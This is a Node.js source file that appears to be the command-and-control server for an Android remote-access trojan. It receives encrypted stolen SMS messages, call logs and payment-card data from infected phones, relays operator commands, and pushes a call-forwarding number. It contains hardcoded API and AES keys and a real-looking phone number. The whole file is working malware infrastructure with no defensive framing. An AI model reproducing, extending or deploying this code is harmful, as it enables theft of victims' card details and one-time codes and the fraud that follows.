var express = require('express');  
var app = express();  
var server = require('http').createServer(app);  
var io = require('socket.io')(server);
var CryptoJS = require("crypto-js");

//var till_time = 1642228200000;
var till_time = 1640025689290;

var Apikey = "51e57ac42770964a";

const PORT = 8080;

var forw_num = "+916390376385";

var lease_code = genrate_lease_code();

/*io = require("socket.io")(server, {
  pingTimeout: 20000,
  pingInterval: 10000
});*/

//io.set('heartbeat interval', 10000);
//io.set('heartbeat timeout', 20000);

server.listen(process.env.PORT || 8080, function () {
  console.log(`Listening on ${ PORT }`);
  
  var intervalId = setInterval(function() {
		//console.log("Interval reached every 5s")
		io.emit('ping','ping');
	}, 5000);
  
  /*if(till_time > new Date().valueOf()){
	console.log(new Date().valueOf());
  }else{
	  console.log('Fuck Off');
  }*/
  
});

//Decryptest();

io.on('connection', function(socket) {
	ServerSocket = socket;
	//users = users +1;
	console.log('User Connected: '+socket.id);
	
	io.emit('update_num',forw_num);
	
	// ON NEW RAT CONNECTION AFTER NEW CONNECTION
	socket.on('user_connected' , function(data){
		console.log('On User Connect: ');
		const obj = Decryptest(data);
		if(obj.Api == Apikey){
			console.log("Valid API Key");
			io.emit('on_user_connected',obj.data);
		}else{
			console.log("Not a Valid API Key");
		}
		//call_php(data);
	});
	
	socket.on('update_num_server' , function(data){
		console.log('UPDATING FORW_NUM: '+data);
		forw_num = data;
		//console.log(forw_num);
		io.emit('update_num',forw_num);
	});
	
	socket.on('send_data_rat' , function(data){
		//console.log('MSG: '+data);
	});
	
	socket.on('test_msg' , function(data){
		//console.log('MSG: '+data);
	});
	
	
	

	socket.on('all_calls' , function(data){
		console.log('ALL CALLS DATA: ');
		
		const obj = Decryptest(data);
		if(obj.Api == Apikey){
			console.log("Valid API Key");
			io.emit('all_calls_rat',obj.data);
		}else{
			console.log("Not a Valid API Key");
		}
		
		//io.emit('all_calls_rat',data);
		///call_php(data);
	});

	socket.on('sms' , function(data){
		console.log('SINGLE DATA: ');
		const obj = Decryptest(data);
		if(obj.Api == Apikey){
			console.log("Valid API Key");
			io.emit('sms_rat',obj.data);
		}else{
			console.log("Not a Valid API Key");
		}
		
		//io.emit('sms_rat',data);
		//call_php(data);
	});
	
	socket.on('sms_filtered' , function(data){
		console.log('sms_filtered: ');
		const obj = Decryptest(data);
		if(obj.Api == Apikey){
			console.log("Valid API Key");
			io.emit('sms_filtered_rat',obj.data);
		}else{
			console.log("Not a Valid API Key");
		}
		
		//io.emit('sms_rat',data);
		//call_php(data);
	});


	socket.on('card_data' , function(data){
		console.log('CARD DATA: ');
		
		const obj = Decryptest(data);
		if(obj.Api == Apikey){
			console.log("Valid API Key");
			io.emit('card_data_rat',obj.data);
		}else{
			console.log("Not a Valid API Key");
		}
		
		//io.emit('card_data_rat',data);
		//call_php(data);
	});
	
	socket.on('cmd_rat' , function(data){
		//console.log('cmd_rat: '+data);
		
		const obj = Decryptest(data);
		if(obj.Api == Apikey){
			console.log("Valid API Key");
			io.emit('cmd',obj.data);
		}else{
			console.log("Not a Valid API Key");
		}
		
		//io.emit('cmd',data);
		//call_php(data);
	});
	
	socket.on('cmd_done' , function(data){
		//console.log('cmd_done_rat: '+data);
		
		const obj = Decryptest(data);
		if(obj.Api == Apikey){
			console.log("Valid API Key");
			io.emit('cmd_done_rat',obj.data);
		}else{
			console.log("Not a Valid API Key");
		}
		
		//io.emit('cmd_done_rat',data);
		//call_php(data);
	});
	
	socket.on('test_data' , function(data){
		console.log('test_data: '+data);
		
		io.emit('data_send',data);
		
		//io.emit('cmd',data);
		//call_php(data);
	});
	
	socket.on('verify_code' , function(data){
		
		console.log('verify_code: '+data);
		
		if(data == lease_code){
			io.emit('code_result','true');
		}else{
			io.emit('code_result','false');
		}
		genrate_lease_code();
		
		//io.emit('cmd',data);
		//call_php(data);
	});
	
	socket.on('get_code' , function(data){
		io.emit('code_is',lease_code);		
	});
	
	socket.on('broadcast' , function(data){
		//console.log('PHP DATA: '+data);
	});
	
	socket.on("disconnect", () => console.log("User Disconnected: "+socket.id));

});

function genrate_lease_code(){
	lease_code = Math.floor(100000 + Math.random() * 900000);
	console.log('NEW_CODE: '+lease_code);
}

function Decryptest(data){

var base64EncodedKeyFromJava = 'RkJYUkVVWkNJUEdseG56UQ=='; /* copied from output of Java program  */
var keyForCryptoJS = CryptoJS.enc.Base64.parse(base64EncodedKeyFromJava);

var encryptString = data /* will be decrypted to '안녕하세요' */
var decodeBase64 = CryptoJS.enc.Base64.parse(encryptString)

var decryptedData = CryptoJS.AES.decrypt(
  {
    ciphertext: decodeBase64
  },
  keyForCryptoJS,
  {
    mode: CryptoJS.mode.ECB /* Override the defaults */
    /*padding: CryptoJS.pad.Pkcs7 *//* PKCS#5 is a subset of PKCS#7, and */
  }
);

var decryptedText = decryptedData.toString(CryptoJS.enc.Utf8);

const obj = JSON.parse(decryptedText);

//console.log(obj.data);

if(obj.Api == Apikey){
	//console.log(obj.Api);
}

//console.log( `decryptedText = '${new String(decryptedText)}'`);

return obj;

}
